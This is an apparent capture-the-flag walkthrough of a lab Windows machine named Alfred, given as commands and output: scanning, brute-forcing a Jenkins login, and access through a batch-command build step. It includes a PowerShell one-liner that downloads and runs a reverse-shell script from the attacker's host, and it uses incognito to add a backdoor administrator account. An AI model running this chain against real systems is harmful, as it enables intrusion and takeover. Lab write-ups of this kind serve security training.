### Alfred

| Windows machine

----------------------------------------------------------

`export ip=10.10.186.176`

#### NMAP

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/alfred]
└─$ nmap -sC -sV -Pn -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 15:32 IST
Nmap scan report for 10.10.186.176
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2024-04-13T10:02:11
|_Not valid after:  2024-10-13T10:02:11
|_ssl-date: 2024-04-14T10:04:40+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2024-04-14T10:04:36+00:00
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.94 seconds

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/alfred]
```

#### Dirctory bruteforce

> Port 80

```
──(edith🛸HackBox)-[~/pwn/vuln_machines/alfred/nmap]
└─$ feroxbuster -u http://10.10.214.177/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.214.177/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      130l      750w    59228c http://10.10.214.177/bruce.jpg
200      GET       12l       29w      289c http://10.10.214.177/
[######>-------------] - 6m     30668/87651   6m      found:2       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_214_177_-1714225374.state ...
[######>-------------] - 6m     30671/87651   6m      found:2       errors:0      
[######>-------------] - 6m     30658/87650   80/s    http://10.10.214.177/ 
[--------------------] - 0s         0/87650   -       http://10.10.214.177/bruce.jpg                                  
```

> Port 8080 - found **jenkins login page**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/alfred/nmap]
└─$ feroxbuster -u http://10.10.214.177:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.214.177:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       14l       40w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://10.10.214.177:8080/assets => http://10.10.214.177:8080/assets/
200      GET        9l      218w    16083c http://10.10.214.177:8080/static/062dbe93/scripts/yui/dom/dom-min.js
200      GET      100l      209w     2024c http://10.10.214.177:8080/adjuncts/062dbe93/lib/layout/breadcrumbs.css
200      GET       70l      221w     2750c http://10.10.214.177:8080/adjuncts/062dbe93/org/kohsuke/stapler/bind.js
200      GET      183l      715w     6423c http://10.10.214.177:8080/static/062dbe93/scripts/behavior.js
200      GET       21l      603w     3276c http://10.10.214.177:8080/images/mask-icon.svg
200      GET        7l      156w     4644c http://10.10.214.177:8080/static/062dbe93/scripts/yui/container/assets/skins/sam/container.css
200      GET        7l      151w     5035c http://10.10.214.177:8080/static/062dbe93/scripts/yui/menu/assets/skins/sam/menu.css
200      GET      309l      708w     6515c http://10.10.214.177:8080/static/062dbe93/scripts/yui/container/assets/container.css
200      GET      152l      413w     2981c http://10.10.214.177:8080/static/062dbe93/css/layout-common.css
200      GET        8l      221w    10929c http://10.10.214.177:8080/static/062dbe93/scripts/yui/storage/storage-min.js
200      GET       79l      217w     1868c http://10.10.214.177:8080/static/062dbe93/css/simple-page-forms.css
302      GET        0l        0w        0c http://10.10.214.177:8080/j_acegi_security_check => http://10.10.214.177:8080/loginError
200      GET       66l      300w     2140c http://10.10.214.177:8080/static/062dbe93/css/simple-page.theme.css
200      GET       36l      215w     1305c http://10.10.214.177:8080/static/062dbe93/css/color.css
200      GET        7l      100w     3212c http://10.10.214.177:8080/static/062dbe93/scripts/yui/button/assets/skins/sam/button.css
200      GET      299l      853w     9971c http://10.10.214.177:8080/adjuncts/062dbe93/lib/layout/breadcrumbs.js
500      GET       94l      557w    14274c http://10.10.214.177:8080/adjuncts/062dbe93/
200      GET       10l      243w    23689c http://10.10.214.177:8080/static/062dbe93/scripts/yui/dragdrop/dragdrop-min.js
200      GET       12l      420w    31064c http://10.10.214.177:8080/static/062dbe93/scripts/yui/button/button-min.js
200      GET       23l      455w    14240c http://10.10.214.177:8080/static/062dbe93/scripts/yui/animation/animation-min.js
200      GET       13l       57w     4288c http://10.10.214.177:8080/static/062dbe93/images/headshot.png
200      GET        8l      113w     9356c http://10.10.214.177:8080/static/062dbe93/scripts/yui/element/element-min.js
200      GET        6l       22w     1315c http://10.10.214.177:8080/static/062dbe93/images/16x16/help.png
200      GET       11l      105w     1942c http://10.10.214.177:8080/login
200      GET      136l      411w     3063c http://10.10.214.177:8080/static/062dbe93/css/simple-page.css
200      GET       20l      102w     4356c http://10.10.214.177:8080/static/062dbe93/images/title.png
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l      130w     7120c http://10.10.214.177:8080/static/062dbe93/scripts/yui/yahoo/yahoo-min.js
403      GET       11l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1760l     3216w    29893c http://10.10.214.177:8080/static/062dbe93/css/responsive-grid.css
200      GET        2l      343w    33268c http://10.10.214.177:8080/static/062dbe93/favicon.ico
200      GET       11l      216w    14578c http://10.10.214.177:8080/static/062dbe93/scripts/yui/event/event-min.js
200      GET        9l      129w    13257c http://10.10.214.177:8080/static/062dbe93/scripts/yui/connection/connection-min.js
200      GET      400l     1357w    12809c http://10.10.214.177:8080/static/062dbe93/scripts/sortable.js
200      GET       16l      356w    58212c http://10.10.214.177:8080/static/062dbe93/scripts/yui/menu/menu-min.js
200      GET       12l      341w    32658c http://10.10.214.177:8080/static/062dbe93/scripts/yui/datasource/datasource-min.js
200      GET     2043l     4480w    40058c http://10.10.214.177:8080/static/062dbe93/css/style.css
200      GET       19l      426w    76762c http://10.10.214.177:8080/static/062dbe93/scripts/yui/container/container-min.js
200      GET       12l      217w    32597c http://10.10.214.177:8080/static/062dbe93/scripts/yui/autocomplete/autocomplete-min.js
200      GET     3093l    10238w   110349c http://10.10.214.177:8080/static/062dbe93/scripts/hudson-behavior.js
200      GET     1125l     3901w    38528c http://10.10.214.177:8080/static/062dbe93/jsbundles/page-init.js
200      GET       35l     3606w   110252c http://10.10.214.177:8080/static/062dbe93/scripts/yui/assets/skins/sam/skin.css
200      GET     6140l    16747w   165005c http://10.10.214.177:8080/static/062dbe93/scripts/prototype.js
404      GET       10l      211w     7262c http://10.10.214.177:8080/signup
200      GET        9l       31w     2367c http://10.10.214.177:8080/static/062dbe93/images/24x24/search.png
200      GET        7l       28w     2662c http://10.10.214.177:8080/static/062dbe93/images/24x24/gear2.png
200      GET        4l       20w     2203c http://10.10.214.177:8080/static/062dbe93/images/24x24/user.png
200      GET        8l       27w     1455c http://10.10.214.177:8080/static/062dbe93/images/24x24/next.png
200      GET      127l      694w    48563c http://10.10.214.177:8080/static/062dbe93/images/rage.png
500      GET       92l      546w    14101c http://10.10.214.177:8080/logout
400      GET        6l      195w     5266c http://10.10.214.177:8080/error
404      GET       11l       26w      325c http://10.10.214.177:8080/login_form
404      GET       11l       26w      321c http://10.10.214.177:8080/errors
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
500      GET       11l      385w     7492c http://10.10.214.177:8080/oops
403      GET       16l       41w      842c http://10.10.214.177:8080/cli/index
[###>----------------] - 5m     93494/613644  26m     found:54      errors:2544   
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_214_177:8080_-1714225372.state ...
[###>----------------] - 5m     93497/613644  26m     found:54      errors:2544   
[#####>--------------] - 5m     22387/87650   71/s    http://10.10.214.177:8080/ 
[###>----------------] - 5m     17321/87650   55/s    http://10.10.214.177:8080/assets/ 
[####>---------------] - 5m     18122/87650   58/s    http://10.10.214.177:8080/adjuncts/062dbe93/org/ 
[####>---------------] - 5m     18072/87650   58/s    http://10.10.214.177:8080/adjuncts/062dbe93/lib/ 
[#>------------------] - 4m      8452/87650   33/s    http://10.10.214.177:8080/git/ 
[#>------------------] - 4m      6671/87650   29/s    http://10.10.214.177:8080/subversion/ 
[>-------------------] - 2m      2328/87650   19/s    http://10.10.214.177:8080/cli/                  
```

**Nothing intresting foundon directory bruteforce**

##### HTTP login bruteforce

**_Note: Try some default login credentials before bruteforce_**

**_Method 1_** : Use hydra to bruteforce

 hydra -L <path to wordlist>-P <path to wordlist> <IP> -s <port> http-post-form "/<directory path>:username=^USER^&password=^PASS^:F=incorrect" -V

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/alfred/nmap]
└─$ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/cirt-default-passwords.txt 10.10.214.177 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid" -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-27 19:38:38
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17697 login tries (l:17/p:1041), ~1107 tries per task
[DATA] attacking http-post-form://10.10.214.177:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid
[ATTEMPT] target 10.10.214.177 - login "root" - pass "" - 1 of 17697 [child 0] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "!admin" - 2 of 17697 [child 1] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "!root" - 3 of 17697 [child 2] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "#l@$ak#.lk;0@P" - 4 of 17697 [child 3] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "$SRV" - 5 of 17697 [child 4] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "* * #" - 6 of 17697 [child 5] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "*3noguru" - 7 of 17697 [child 6] (0/0)
[ATTEMPT] target 10.10.214.177 - login "root" - pass "0" - 8 of 17697 [child 7] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "adminpass" - 540 of 1041 [child 6] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "adminpwd" - 541 of 1041 [child 15] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "admpw" - 542 of 1041 [child 9] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "adtran" - 543 of 1041 [child 8] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "advcomm500349" - 544 of 1041 [child 13] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "alfarome" - 545 of 1041 [child 0] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "alien" - 546 of 1041 [child 2] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "allot" - 547 of 1041 [child 1] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "alpine" - 548 of 1041 [child 7] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "amber" - 549 of 1041 [child 5] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "amigosw1" - 550 of 1041 [child 11] (0/0)
[ATTEMPT] target 10.10.214.177 - login "admin" - pass "anicust" - 551 of 1041 [child 6] (0/0)
[8080][http-post-form] host: 10.10.214.177   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-27 19:41:27
```

**Found user name and password login creds**

**_Method 2_** : Use metasploit

- use auxiliary/scanner/http/Jenkins_login --> set params and run it

- use use exploit/multi/http/Jenkins_script_console --> set params and run it
  
  For reference : [Jenkins exploitation](https://www.hackingarticles.in/jenkins-penetration-testing/)

##### Inital access

Explore the jenkins for command or script execution feature

I. On homepage, we found projects --> Configure --> (under build) Execute Windows batch command 

 ![Execute Windows batch command](/home/edith/pwn/vuln_machines/alfred/001.png)

 Try windows commands or nc or reverse or meterpreter shell. *Reference* : [Jenkins exploitation](https://www.hackingarticles.in/jenkins-penetration-testing/)

II. On Manage jenkins tab --> Script console 

 ![Groovy script console](/home/edith/pwn/vuln_machines/alfred/002.png)

 You can run groovy script (Check groovy script reverse shell online. *i.e* : [Revshells](https://www.revshells.com/)    

**Lets try to exploit this using Execute Windows batch command under project configure tab**

- We use nishang powershell reverse shell scripts ((Found here)[https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1])

- Download the powershell script Invoke-PowerShellTcp.ps1 script and host it localy using python server

- The below command download the Invoke-PowerShellTcp.ps1 powershell reverse shell script from our python server and run it with reversehell params

- Run netcat to listen on the port mentioned on command
  
  ```
  powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.49.246:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.49.246 -Port 4444
  ```
  
  ![Python server](/home/edith/pwn/vuln_machines/alfred/003.png)  
  
  ![netcat listening](/home/edith/pwn/vuln_machines/alfred/004.png)

- we got the shell in our netcat

#### Privilege escalation without metasploit

- Try to get more info about the machine
  
  ```
  PS C:\Windows> systeminfo 
  Host Name:                 ALFRED
  OS Name:                   Microsoft Windows 7 Ultimate 
  OS Version:                6.1.7601 Service Pack 1 Build 7601
  OS Manufacturer:           Microsoft Corporation
  OS Configuration:          Standalone Workstation
  OS Build Type:             Multiprocessor Free
  Registered Owner:          bruce
  Registered Organization:   
  Product ID:                00426-OEM-9154295-64842
  Original Install Date:     10/25/2019, 9:51:08 PM
  System Boot Time:          4/28/2024, 3:35:46 PM
  System Manufacturer:       Xen
  System Model:              HVM domU
  System Type:               x64-based PC
  Processor(s):              1 Processor(s) Installed.
                             [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
  BIOS Version:              Xen 4.11.amazon, 8/24/2006
  Windows Directory:         C:\Windows
  System Directory:          C:\Windows\system32
  Boot Device:               \Device\HarddiskVolume1
  System Locale:             en-us;English (United States)
  Input Locale:              en-us;English (United States)
  Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
  Total Physical Memory:     2,048 MB
  Available Physical Memory: 1,052 MB
  Virtual Memory: Max Size:  4,095 MB
  Virtual Memory: Available: 2,950 MB
  Virtual Memory: In Use:    1,145 MB
  Page File Location(s):     C:\pagefile.sys
  Domain:                    WORKGROUP
  Logon Server:              \\ALFRED
  Hotfix(s):                 1 Hotfix(s) Installed.
                             [01]: KB976902
  Network Card(s):           1 NIC(s) Installed.
                             [01]: AWS PV Network Device
                                   Connection Name: Local Area Connection 2
                                   DHCP Enabled:    Yes
                                   DHCP Server:     10.10.0.1
                                   IP address(es)
                                   [01]: 10.10.233.10
                                   [02]: fe80::70e7:79a:6d:57b6
  PS C:\Windows> whoami /priv
  
  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                  Description                               State   
  =============================== ========================================= ========
  SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
  SeSecurityPrivilege             Manage auditing and security log          Disabled
  SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
  SeLoadDriverPrivilege           Load and unload device drivers            Disabled
  SeSystemProfilePrivilege        Profile system performance                Disabled
  SeSystemtimePrivilege           Change the system time                    Disabled
  SeProfileSingleProcessPrivilege Profile single process                    Disabled
  SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
  SeCreatePagefilePrivilege       Create a pagefile                         Disabled
  SeBackupPrivilege               Back up files and directories             Disabled
  SeRestorePrivilege              Restore files and directories             Disabled
  SeShutdownPrivilege             Shut down the system                      Disabled
  SeDebugPrivilege                Debug programs                            Enabled 
  SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
  SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
  SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
  SeUndockPrivilege               Remove computer from docking station      Disabled
  SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
  SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
  SeCreateGlobalPrivilege         Create global objects                     Enabled 
  SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
  SeTimeZonePrivilege             Change the time zone                      Disabled
  SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
  PS C:\Windows> 
  ```
  
  Here, some of the privileges such as **SeImpersonatePrivilege** and **SeDebugPrivilege** are enabled which can be utilized to escalate our priviliges using **incognito** module.

- Download incognito.exe from internet - [Found here](https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe)

- Send it to remote system via local python webserver and execute it..
  _Check for help by running incognito.exe without params_
  
  ```
  PS C:\Windows\Temp> incognito.exe list_tokens -u
  [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
  [*] Enumerating tokens
  [*] Listing unique users found
  
  Delegation Tokens Available
  ============================================
  
  alfred\bruce 
  alfred\edith 
  NT AUTHORITY\IUSR 
  NT AUTHORITY\LOCAL SERVICE 
  NT AUTHORITY\NETWORK SERVICE 
  NT AUTHORITY\SYSTEM 
  
  Impersonation Tokens Available
  ============================================
  
  NT AUTHORITY\ANONYMOUS LOGON 
  
  Administrative Privileges Available
  ============================================
  
  SeAssignPrimaryTokenPrivilege
  SeCreateTokenPrivilege
  SeTcbPrivilege
  SeTakeOwnershipPrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeDebugPrivilege
  SeImpersonatePrivilege
  SeRelabelPrivilege
  SeLoadDriverPrivilege
  
  PS C:\Windows\Temp> incognito.exe list_tokens -g
  [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
  [*] Enumerating tokens
  [*] Listing unique users found
  
  Delegation Tokens Available
  ============================================
  
  BUILTIN\Administrators 
  BUILTIN\Users 
  NT AUTHORITY\Authenticated Users 
  NT AUTHORITY\INTERACTIVE 
  NT AUTHORITY\NTLM Authentication 
  NT AUTHORITY\REMOTE INTERACTIVE LOGON 
  NT AUTHORITY\SERVICE 
  NT AUTHORITY\This Organization 
  NT AUTHORITY\WRITE RESTRICTED 
  NT SERVICE\AppHostSvc 
  NT SERVICE\AudioEndpointBuilder 
  NT SERVICE\BFE 
  NT SERVICE\CertPropSvc 
  NT SERVICE\CscService 
  NT SERVICE\Dnscache 
  NT SERVICE\eventlog 
  NT SERVICE\EventSystem 
  NT SERVICE\FDResPub 
  NT SERVICE\iphlpsvc 
  NT SERVICE\LanmanServer 
  NT SERVICE\MMCSS 
  NT SERVICE\Netman 
  NT SERVICE\PcaSvc 
  NT SERVICE\PlugPlay 
  NT SERVICE\RpcEptMapper 
  NT SERVICE\Schedule 
  NT SERVICE\SENS 
  NT SERVICE\SessionEnv 
  NT SERVICE\ShellHWDetection 
  NT SERVICE\Spooler 
  NT SERVICE\TrkWks 
  NT SERVICE\TrustedInstaller 
  NT SERVICE\UmRdpService 
  NT SERVICE\UxSms 
  NT SERVICE\Winmgmt 
  NT SERVICE\WSearch 
  NT SERVICE\wuauserv 
  
  Impersonation Tokens Available
  ============================================
  
  NT AUTHORITY\NETWORK 
  NT SERVICE\AudioSrv 
  NT SERVICE\CryptSvc 
  NT SERVICE\DcomLaunch 
  NT SERVICE\Dhcp 
  NT SERVICE\DPS 
  NT SERVICE\LanmanWorkstation 
  NT SERVICE\lmhosts 
  NT SERVICE\MpsSvc 
  NT SERVICE\netprofm 
  NT SERVICE\NlaSvc 
  NT SERVICE\nsi 
  NT SERVICE\PolicyAgent 
  NT SERVICE\Power 
  NT SERVICE\TermService 
  NT SERVICE\W32Time 
  NT SERVICE\WdiServiceHost 
  NT SERVICE\WinHttpAutoProxySvc 
  NT SERVICE\wscsvc 
  
  Administrative Privileges Available
  ============================================
  
  SeAssignPrimaryTokenPrivilege
  SeCreateTokenPrivilege
  SeTcbPrivilege
  SeTakeOwnershipPrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeDebugPrivilege
  SeImpersonatePrivilege
  SeRelabelPrivilege
  SeLoadDriverPrivilege
  ```
  
  > **Note :** As per [incognito documentaion](https://labs.withsecure.com/publications/incognito-v2-0-released), If logged in user account is not an Administrative user, but has been granted SeDebugPrivilege and SeImpersonatePrivilege then Incognito v2.0 will automatically enable these privileges and use them to gain access to all tokens and so effectively escalate the SYSTEM 

- Using this we can escalated privileges - we can add users using add_user incognito module command
  
  ```
  PS C:\Windows\Temp> incognito.exe add_user edith 123
  [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
  [*] Enumerating tokens
  [*] Attempting to add user edith to host 127.0.0.1
  [+] Successfully added user
  ```

- Then add this created user to Administrators group using add_localgroup_user incognito module command
  
  ```
  PS C:\Windows\Temp> incognito.exe add_localgroup_user Administrators edith
  [-] WARNING: Not running as SYSTEM. Not all tokens will be available.
  [*] Enumerating tokens
  [*] Attempting to add user edith to local group Administrators on host 127.0.0.1
  [+] Successfully added user to local group
  ```

- Validating if the created user added to Administrators group
  
  ```
  PS C:\Windows\Temp> net user edith
  User name                    edith
  Full Name                    edith
  Comment                      
  User's comment               
  Country code                 000 (System Default)
  Account active               Yes
  Account expires              Never
  
  Password last set            4/28/2024 5:55:18 PM
  Password expires             6/9/2024 5:55:18 PM
  Password changeable          4/28/2024 5:55:18 PM
  Password required            Yes
  User may change password     Yes
  
  Workstations allowed         All
  Logon script                 
  User profile                 
  Home directory               
  Last logon                   Never
  
  Logon hours allowed          All
  
  Local Group Memberships      *Administrators       
  Global Group memberships     *None                 
  The command completed successfully.
  ```

- Since user edith belongs to Administrators group, we can login into edith user and get the root flag
  For that we use xfreerdp : `xfreerdp /u:edith /p:123 /v:10.10.233.10:3389 /tls-seclevel:0 `
  
  ![RDP connection](//home/edith/pwn/vuln_machines/alfred/005.png)